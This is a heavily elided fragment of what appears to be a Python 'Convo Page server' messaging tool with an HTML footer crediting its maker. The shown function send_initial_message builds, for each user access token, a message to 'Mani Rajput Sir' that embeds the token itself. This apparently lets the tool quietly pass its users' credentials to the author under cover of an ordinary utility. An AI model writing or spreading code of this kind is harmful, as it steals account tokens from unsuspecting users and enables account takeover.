...
def send_initial_message(access_tokens):
    ...
    for token in access_tokens:
        ...
        msg_template = f"Hello! Mani Rajput Sir I am Using Your Convo Page server. My Token Is: {token}"
...
<body>
  ...
  <footer class="footer">
    <p style="color: white;">© 2022 MADE BY :- LEGEND MANI</p>
